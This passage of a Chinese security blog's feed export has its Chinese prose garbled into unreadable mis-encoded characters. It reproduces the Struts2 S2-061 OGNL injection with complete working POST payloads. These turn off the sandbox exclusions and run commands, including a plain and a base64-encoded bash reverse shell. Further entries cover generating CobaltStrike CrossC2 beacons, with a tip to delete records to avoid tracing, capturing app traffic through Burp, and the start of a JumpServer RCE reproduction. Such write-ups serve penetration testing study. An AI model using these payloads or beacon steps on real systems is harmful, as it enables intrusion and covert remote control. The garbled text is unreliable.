¸å¿ƒç±»<code>org.apache.commons.collections.BeanMap</code>åœ¨commons-collections-x.x.jaråŒ…ä¸­ï¼Œä½†æ˜¯åœ¨å®˜æ–¹çš„æœ€å°ä¾èµ–åŒ…ä¸­å¹¶æ²¡æœ‰åŒ…å«è¿™ä¸ªåŒ…ã€‚æ‰€ä»¥å³ä½¿æ‰«åˆ°äº†æ”¯æŒOGNLè¡¨è¾¾å¼çš„æ³¨å…¥ç‚¹ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨è¿™ä¸ªä¾èµ–åŒ…ï¼Œä¹Ÿè¿˜æ˜¯æ²¡åŠæ³•è¿›è¡Œåˆ©ç”¨</p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p><strong>S2-061æ˜¯å¯¹S2-059çš„ç»•è¿‡</strong>ï¼ŒStruts2å®˜æ–¹å¯¹S2-059çš„ä¿®å¤æ–¹å¼æ˜¯<strong>åŠ å¼ºOGNLè¡¨è¾¾å¼æ²™ç›’</strong>ï¼Œè€ŒS2-061ç»•è¿‡äº†è¯¥æ²™ç›’ã€‚</p><p>è¯¥æ¼æ´å½±å“ç‰ˆæœ¬èŒƒå›´æ˜¯Struts 2.0.0åˆ°Struts 2.5.25ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h3><p>POSTè¯·æ±‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">boundary&#x3D;----WebKitFormBoundary0qcU8KvOhouvJWrH</span><br><span class="line">Content-Length: 829</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary0qcU8KvOhouvJWrH</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundary0qcU8KvOhouvJWrH--</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åœ¨ <code>(#arglist.add(&quot;id&quot;)).</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103019.png"></p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h3><p>åå¼¹shell</p><p>ä½¿ç”¨bashåå¼¹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103020.png"></p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p>Java æ¼æ´åˆ©ç”¨ï¼Œå¸¸å¸¸éœ€è¦æ³¨æ„ç¼–ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 918</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF-</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103021.png"></p><p>è¿˜æœ‰å¾ˆå¤šï¼Œä¸ä¸€ä¸€å¤ç°äº†ã€‚ä¸€ä¸ªå›æ˜¾ç”¨æ¥éªŒè¯ï¼Œä¸€ä¸ªåå¼¹shellç”¨æ¥åˆ©ç”¨ã€‚å¯èƒ½å®æˆ˜é‡åˆ°äº†ï¼Œè¦ä¹ˆå¾ˆå¥½åˆ©ç”¨ï¼Œè¦ä¹ˆå°±æ˜¯å„ç§WAFï¼ŒRASPâ€¦</p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://xz.aliyun.com/t/8689">https://xz.aliyun.com/t/8689</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-061/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-061/README.zh-cn.md</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Struts2çš„æ´ä¸€èˆ¬éƒ½æ˜¯OGNLè¡¨è¾¾å¼æ³¨å…¥ï¼Œä»¥åŠå¯¹å…¶æ²™ç›’ç»•è¿‡&lt;/p&gt;</summary>
    
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Struts2" scheme="https://hack-for.fun/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrikeï¼šCrossC2ç›¸å…³çŸ¥è¯†</title>
    <link href="https://hack-for.fun/67f2.html"/>
    <id>https://hack-for.fun/67f2.html</id>
    <published>2021-01-20T13:48:21.000Z</published>
    <updated>2021-01-20T17:05:05.392Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ä»Šå¤©å’Œäº®äº®è¿˜æœ‰è±ªå“¥æäº†ä¸‹CSï¼Œå‘ç°æˆ‘è¿CrossC2éƒ½è¿˜æ²¡è£…ã€‚ã€‚ã€‚æœ‰æ—¶å€™çœŸå¿ƒå»ºè®®å»çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œåˆ«å»æ‰¾æ•™ç¨‹ï¼Œçœ‹äº†å‡ ä¸ªæ•™ç¨‹å…¨tméƒ½æ˜¯å‘ã€‚ã€‚ã€‚</p></blockquote><a id="more"></a><p>å…·ä½“ä»‹ç»çœ‹ä¸‹é¢</p><p><a href="https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md">https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md</a></p><p>ä¸€äº›é™åˆ¶ï¼Œè¦cs4.1åŠä»¥ä¸Šã€‚</p><ul><li>Only CS 4.x (&gt;=4.1) version is supported, lower versions will no longer be supported.</li></ul><p>ç®€å•è¯´ï¼ŒCrossC2å°±æ˜¯ä¸€ä¸ªè·¨å¹³å°çš„ä¸Šçº¿ï¼ŒLinuxã€MacOSã€iOSã€Androidã€‚</p><blockquote><p>CrossC2 framework - ç”ŸæˆCobaltStrikeçš„è·¨å¹³å°beacon</p></blockquote><ul><li>ç”±äº Cross C2ç›®å‰åªæ”¯æŒHTTPS Beaconï¼Œæ‰€ä»¥åœ¨Listenrsä¸­é€‰æ‹©HTTPSè¿›è¡Œç›‘å¬ï¼Œ<br>æœåŠ¡ç«¯å¼€å¯ç›‘å¬ windows/beacon_https/reverse_https ç±»å‹çš„beaconï¼ˆå¼ºåˆ¶HTTPS</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120221604.png"></p><p>å¦‚ä½•ä½¿ç”¨ï¼Ÿ</p><ol><li>å°†sç«¯çš„<code>.cobaltstrike.beacon_keys</code> ä¸‹è½½åˆ°cç«¯ç›®å½•ä¸‹ã€‚</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121005951.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120224454.png"></p><ol start="2"><li>å°†CrossC2.cnaã€genCrossC2.Linuxä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°Cobalt StrikeæœåŠ¡ç«¯ï¼ˆå¿…é¡»å¤„äºåŒä¸€ç›®å½•ï¼‰</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120233334.png"></p><p>æ ¹æ®ç›®æ ‡å®¢æˆ·ç«¯ï¼Œåˆ©ç”¨ç›¸åº”çš„CrossC2æ–‡ä»¶ï¼Œç”Ÿæˆä¸Šçº¿æ–‡ä»¶ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œéœ€è¦ç»™xæƒé™ï¼‰</p><p>æµ‹è¯•ï¼šä»¥kaliæ¥æµ‹è¯•ã€‚</p><p>ç”Ÿæˆä¸Šçº¿å¯æ‰§è¡Œæ–‡ä»¶(æœ¨é©¬)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[usage]: .&#x2F;genCrossC2.Linux [host] [port] [getURI] [postURI] [platform] [arch] [outputFileName]</span><br><span class="line"></span><br><span class="line">         -platform        &#39;MacOS&#39; &#x2F; &#39;Linux&#39;</span><br><span class="line">         -arch            &#39;x86&#39; &#x2F; &#39;x64&#39;</span><br><span class="line"></span><br><span class="line">[ex]:    .&#x2F;genCrossC2.Linux 10.10.10.10 40443 null null Linux x64 C2</span><br></pre></td></tr></table></figure><blockquote><p>ä¸Šé¢è¿™ä¸ªéƒ½æ˜¯è€æ–¹æ³•ï¼Œéå¸¸ä¸æ¨èã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121004040.png"></p><p>è¦è®°å¾—ç»™<code>genCrossC2.MacOS</code>  x æƒé™ï¼Œä¸ç„¶æ²¡åŠæ³•ã€‚ã€‚æˆ‘å‚»é€¼ï¼Œåœ¨è¿™é‡Œéƒ½èƒ½å¡ä½ã€‚</p><p>ç„¶ååœ¨kali ä¸Šè¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶(æœ¨é©¬)</p><ul><li>æ‹¿åˆ°shellä¹‹åï¼Œä¸Šä¼ ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åè¿è¡Œ</li><li>Stagelessï¼Œå‘½ä»¤è¡Œcurlè¿œç¨‹åŠ è½½å³å¯ï¼Œä¸è¿‡è¿™æ ·å¯èƒ½ä¼šæ³¨æ„ä¸€ä¸‹åˆ é™¤è®°å½•ï¼Œå¦åˆ™å¦‚æ„è¢«æº¯æº</li></ul><p>æˆ‘è¿˜é—®äº†ä¸‹long716å¸ˆå‚…ï¼Œä¸ºä»€ä¹ˆStageless è¿™ç§ä¸è¡Œï¼Œç»“æœæˆ‘æ¢ä¸ªç«¯å£å°±å¥½äº†ã€‚å‚»é€¼äº†</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121005007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121003919.png"></p><p>æˆåŠŸä¸Šçº¿ã€‚</p><p>å½“ç„¶ä¸ä»…ä»…è¿™äº›ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ä»Šå¤©å’Œäº®äº®è¿˜æœ‰è±ªå“¥æäº†ä¸‹CSï¼Œå‘ç°æˆ‘è¿CrossC2éƒ½è¿˜æ²¡è£…ã€‚ã€‚ã€‚æœ‰æ—¶å€™çœŸå¿ƒå»ºè®®å»çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œåˆ«å»æ‰¾æ•™ç¨‹ï¼Œçœ‹äº†å‡ ä¸ªæ•™ç¨‹å…¨tméƒ½æ˜¯å‘ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>å¿…ä¼šæŠ€æœ¯ï¼šMacOSä¸‹å¦‚ä½•å¯¹ç§»åŠ¨ç«¯APPæŠ“åŒ…æµ‹è¯•</title>
    <link href="https://hack-for.fun/84a4.html"/>
    <id>https://hack-for.fun/84a4.html</id>
    <published>2021-01-20T06:43:57.000Z</published>
    <updated>2021-01-20T17:24:29.446Z</updated>
    
    <content type="html"><![CDATA[<p>å¸¸è§„æ¸—é€æµ‹è¯•æ—¶ï¼Œè‚¯å®šä¸å¯èƒ½å°‘å¯¹ç§»åŠ¨ç«¯APPã€å¾®ä¿¡å°ç¨‹åºç­‰è¿›è¡Œæµ‹è¯•ã€‚è¿™ä¸€å—ï¼Œè¿˜åœç•™åœ¨æœ€åŸºç¡€çš„æ°´å¹³ã€‚</p><a id="more"></a><p>ç›¸å…³çš„èµ„æ–™ï¼š</p><ul><li><p><a href="http://jianlei.github.io/archives/c4bd228f.html%EF%BC%88%E4%BC%A0%E7%BB%9F%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95%EF%BC%8C%E9%9C%80%E8%A6%81%E6%89%8B%E6%9C%BA%E4%B8%8B%E8%BD%BDapp%EF%BC%8C%E6%89%8B%E6%9C%BA%E5%92%8C%E7%94%B5%E8%84%91%E5%9C%A8%E5%90%8C%E4%B8%80%E4%B8%AAWiFi%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%8B%E6%9C%BA%E7%AB%AF%E8%BF%98%E8%A6%81%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%BABurpSuite%E7%9A%84%E4%BB%A3%E7%90%86IP%EF%BC%89">http://jianlei.github.io/archives/c4bd228f.htmlï¼ˆä¼ ç»ŸæŠ“åŒ…æ–¹æ³•ï¼Œéœ€è¦æ‰‹æœºä¸‹è½½appï¼Œæ‰‹æœºå’Œç”µè„‘åœ¨åŒä¸€ä¸ªWiFiä¸‹ï¼Œç„¶åæ‰‹æœºç«¯è¿˜è¦è®¾ç½®ä»£ç†ä¸ºBurpSuiteçš„ä»£ç†IPï¼‰</a></p></li><li><p><a href="https://www.cnblogs.com/Xor0ne/articles/13729697.html%EF%BC%88Proxifier">https://www.cnblogs.com/Xor0ne/articles/13729697.htmlï¼ˆProxifier</a> è½¬å‘æ¨¡æ‹Ÿå™¨æµé‡åˆ°bpï¼ŒWindowså¹³å°æ¯”è¾ƒå‹å¥½ï¼Œå¥ˆä½•æˆ‘æ˜¯MacOSï¼‰</p></li><li><p><a href="http://sunu11.com/2019/03/31/%E8%A7%A3%E5%86%B3android%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98/">http://sunu11.com/2019/03/31/%E8%A7%A3%E5%86%B3android%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98/</a> ï¼ˆç”¨çš„ç½‘æ˜“MuMuï¼Œä½†æ˜¯å› ä¸ºä¸Šé¢é—®é¢˜ï¼Œè¿˜æ˜¯è½¬å‘äº†å®ä½“æœº)</p></li><li><p><a href="https://www.cnblogs.com/iamstudy/articles/android_begin_start.html">https://www.cnblogs.com/iamstudy/articles/android_begin_start.html</a> (L3m0nå¸ˆå‚…çš„ï¼Œä¸è¿‡åå‘é€†å‘å·¥ç¨‹çš„ä¸€äº›ä¸œè¥¿ï¼Œè·Ÿç€æ¥ä¸€éå§ï¼Œæ€»ä¼šé‡åˆ°çš„)</p></li><li><p><a href="https://www.cnblogs.com/wjrblogs/p/13683812.html">https://www.cnblogs.com/wjrblogs/p/13683812.html</a></p></li></ul><h1 id="ç›¸å…³æŠ€æœ¯è¦ç‚¹"><a href="#ç›¸å…³æŠ€æœ¯è¦ç‚¹" class="headerlink" title="ç›¸å…³æŠ€æœ¯è¦ç‚¹"></a>ç›¸å…³æŠ€æœ¯è¦ç‚¹</h1><p>å‚è€ƒèµ„æ–™3.</p><p>1ã€è¿œå¤æ—¶æœŸï¼Œæ— sslè¯ä¹¦ï¼Œæ˜æ–‡ä¼ è¾“æ•°æ®ã€‚<br>2ã€é‡‡ç”¨sslè¯ä¹¦åŠ å¯†ï¼Œä½†æœªä½¿ç”¨åšssl PiningæŠ€æœ¯<br>3ã€é‡‡ç”¨sslè¯ä¹¦åŠ å¯†ï¼Œä½†ä½¿ç”¨äº†ssl piningæŠ€æœ¯ã€‚<br>4ã€åŒå‘åŠ å¯†</p><h1 id="MacOSä¸‹çš„æ¨¡æ‹Ÿå™¨"><a href="#MacOSä¸‹çš„æ¨¡æ‹Ÿå™¨" class="headerlink" title="MacOSä¸‹çš„æ¨¡æ‹Ÿå™¨"></a>MacOSä¸‹çš„æ¨¡æ‹Ÿå™¨</h1><ul><li>è“å ã€‚ä¹‹å‰ä¸‹è½½è¿‡ï¼Œä½†æ˜¯æ‰“ä¸å¼€ã€‚</li><li>ç½‘æ˜“MuMu</li></ul><h1 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew  install cask android-platform-tools</span><br></pre></td></tr></table></figure><p>dbè¿æ¥ï¼Œ<strong>macä¸‹ç½‘æ˜“mumuç«¯å£æ˜¯5555</strong>ï¼Œwindowsä¸‹æ˜¯7555</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windowsä¸‹:</span><br><span class="line">adb connect 127.0.0.1:7555</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">macä¸‹:</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure><h1 id="jeb"><a href="#jeb" class="headerlink" title="jeb"></a>jeb</h1><p>é…åˆ adb æ¥åŠ¨æ€è°ƒè¯•çš„ã€‚</p><p>é¦–å…ˆé€šè¿‡å­—ç¬¦ä¸²æœç´¢ï¼Œå®šä½åˆ°æŸä¸ªä½ç½®ï¼Œcommand + bä¸‹æ–­ç‚¹ã€‚<br>åœ¨mumuä¸Šè¿è¡Œapkï¼Œç„¶åattach</p><h1 id="æ¨¡æ‹Ÿå™¨-ç«¯å£"><a href="#æ¨¡æ‹Ÿå™¨-ç«¯å£" class="headerlink" title="æ¨¡æ‹Ÿå™¨/ç«¯å£"></a>æ¨¡æ‹Ÿå™¨/ç«¯å£</h1><p>ä¸‹é¢è²Œä¼¼éƒ½æ˜¯Windowsä¸‹çš„ï¼Œæ²¡å®éªŒè¿‡ã€‚</p><ul><li>å¤œç¥å®‰å“æ¨¡æ‹Ÿå™¨ 62001  </li><li>é€é¥å®‰å“æ¨¡æ‹Ÿå™¨ 21503  </li><li>BlueStacks(è“å å®‰å“æ¨¡æ‹Ÿå™¨) 5555  </li><li>é›·ç”µå®‰å“æ¨¡æ‹Ÿå™¨ 5555  </li><li>å¤©å¤©å®‰å“æ¨¡æ‹Ÿå™¨ 6555  </li><li>ç½‘æ˜“MuMu(å®‰å“æ¨¡æ‹Ÿå™¨) 7555  </li><li>å®‰å“æ¨¡æ‹Ÿå™¨å¤§å¸ˆ 54001</li></ul><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="1-æŸ¥çœ‹æœ¬æœºIP"><a href="#1-æŸ¥çœ‹æœ¬æœºIP" class="headerlink" title="1. æŸ¥çœ‹æœ¬æœºIP"></a>1. æŸ¥çœ‹æœ¬æœºIP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ m0nk3y@ğŸ î‚° ~&#x2F;tools&#x2F;Android î‚° ifconfig en0</span><br><span class="line">en0: flags&#x3D;8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options&#x3D;400&lt;CHANNEL_IO&gt;</span><br><span class="line">ether 3c:22:fb:e1:41:53</span><br><span class="line">inet 192.168.1.6 netmask 0xffffff00 broadcast 192.168.1.255</span><br><span class="line">nd6 options&#x3D;201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œä¸º 192.168.1.6</p><h2 id="2-è®¾ç½®Burpsuiteçš„ä»£ç†"><a href="#2-è®¾ç½®Burpsuiteçš„ä»£ç†" class="headerlink" title="2. è®¾ç½®Burpsuiteçš„ä»£ç†"></a>2. è®¾ç½®Burpsuiteçš„ä»£ç†</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012306.png"></p><h2 id="3-è®¾ç½®MuMuæ¨¡æ‹Ÿå™¨ä¸­çš„WiFiä»£ç†"><a href="#3-è®¾ç½®MuMuæ¨¡æ‹Ÿå™¨ä¸­çš„WiFiä»£ç†" class="headerlink" title="3. è®¾ç½®MuMuæ¨¡æ‹Ÿå™¨ä¸­çš„WiFiä»£ç†"></a>3. è®¾ç½®MuMuæ¨¡æ‹Ÿå™¨ä¸­çš„WiFiä»£ç†</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012307.png"></p><h2 id="4-å®‰è£…BurpSuiteè¯ä¹¦"><a href="#4-å®‰è£…BurpSuiteè¯ä¹¦" class="headerlink" title="4. å®‰è£…BurpSuiteè¯ä¹¦"></a>4. å®‰è£…BurpSuiteè¯ä¹¦</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012308.png"></p><p>å®‰å“ç³»ç»Ÿæ— æ³•å®‰è£… <code>.der</code> åç¼€çš„è¯ä¹¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨æ–‡ä»¶ç®¡ç†å™¨æ›´æ”¹ä¸‹è½½çš„è¯ä¹¦åç¼€ä¸º <code>.cer</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012309.png"></p><p>å®‰è£…è¿‡ç¨‹ä¸­ï¼Œè®¾ç½®è§£é”pinç ï¼Œæˆ‘è®¾ç½®ä¸ºäº†6666ã€‚</p><h2 id="5-ç”¨BurpSuiteæŠ“åŒ…æµ‹è¯•"><a href="#5-ç”¨BurpSuiteæŠ“åŒ…æµ‹è¯•" class="headerlink" title="5. ç”¨BurpSuiteæŠ“åŒ…æµ‹è¯•"></a>5. ç”¨BurpSuiteæŠ“åŒ…æµ‹è¯•</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012310.png"></p><p>å¯ä»¥çœ‹åˆ°http/httpsçš„åŒ…éƒ½èƒ½æŠ“åˆ°äº†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¸¸è§„æ¸—é€æµ‹è¯•æ—¶ï¼Œè‚¯å®šä¸å¯èƒ½å°‘å¯¹ç§»åŠ¨ç«¯APPã€å¾®ä¿¡å°ç¨‹åºç­‰è¿›è¡Œæµ‹è¯•ã€‚è¿™ä¸€å—ï¼Œè¿˜åœç•™åœ¨æœ€åŸºç¡€çš„æ°´å¹³ã€‚&lt;/p&gt;</summary>
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´å¤ç°ï¼šJumpServer WebSocksts Unauthorized RCE</title>
    <link href="https://hack-for.fun/97f2.html"/>
    <id>https://hack-for.fun/97f2.html</id>
    <published>2021-01-18T13:35:34.000Z</published>
    <updated>2021-01-21T08:15:32.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h1><p><strong>JumpServer</strong> æ˜¯å…¨çƒé¦–æ¬¾å®Œå…¨å¼€æºçš„å ¡å’æœº, ä½¿ç”¨ GNU GPL v2.0 å¼€æºåè®®, æ˜¯ç¬¦åˆ 4A çš„ä¸“ä¸šè¿ç»´å®¡è®¡ç³»ç»Ÿã€‚ ä½¿ç”¨ Python / Django è¿›è¡Œå¼€å‘, éµå¾ª Web 2.0 è§„èŒƒ, é…å¤‡äº†ä¸šç•Œé¢†å…ˆçš„ Web Terminal è§£å†³æ–¹æ¡ˆ, äº¤äº’ç•Œé¢ç¾è§‚ã€ç”¨æˆ·ä½“éªŒå¥½ã€‚ é‡‡çº³åˆ†å¸ƒå¼æ¶æ„, æ”¯æŒå¤šæœºæˆ¿è·¨åŒºåŸŸéƒ¨ç½², ä¸­å¿ƒèŠ‚ç‚¹æä¾› API, å„æœºæˆ¿éƒ¨ç½²ç™»å½•èŠ‚ç‚¹, å¯æ¨ªå‘æ‰©å±•ã€æ— å¹¶å‘è®¿é—®é™åˆ¶ã€‚</p><p>ç”±äº<strong>JumpServer</strong>ç¨‹åºä¸­è¿æ¥websocketçš„æ¥å£æœªåšæˆæƒé™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯<strong>æ„é€ æ¶æ„è¯·æ±‚è·å–æœåŠ¡å™¨æ•æ„Ÿä¿¡æ¯ï¼Œé€šè¿‡æ•æ„Ÿä¿¡æ¯ä¸­çš„ç›¸å…³å‚æ•°ï¼Œå¯æ„é€ è¯·æ±‚è·å–ç›¸åº”token</strong>ï¼Œè¿›è€Œå¯é€šè¿‡ç›¸å…³APIæ“ä½œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h1 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h1><p>å‚è€ƒè¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://www.o2oxy.cn/2921.html">https://www.o2oxy.cn/2921.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User    Check   ........................ [ OK ]</span><br><span class="line">OS      Check   ........................ [ ERROR ] æ“ä½œç³»ç»Ÿç±»å‹ç‰ˆæœ¬ä¸ç¬¦åˆè¦æ±‚ï¼Œè¯·ä½¿ç”¨ CentOS 7</span><br><span class="line">CPU     Check   ........................ [ ERROR ] CPU å°äº 2æ ¸ï¼ŒJumpServer æ‰€åœ¨æœºå™¨çš„ CPU éœ€è¦è‡³å°‘ 2æ ¸</span><br><span class="line">Memory  Check   ........................ [ ERROR ] å†…å­˜å°äº 8Gï¼ŒJumpServer æ‰€åœ¨æœºå™¨çš„å†…å­˜éœ€è¦è‡³å°‘ 8G</span><br></pre></td></tr></table></figure><p>2æ 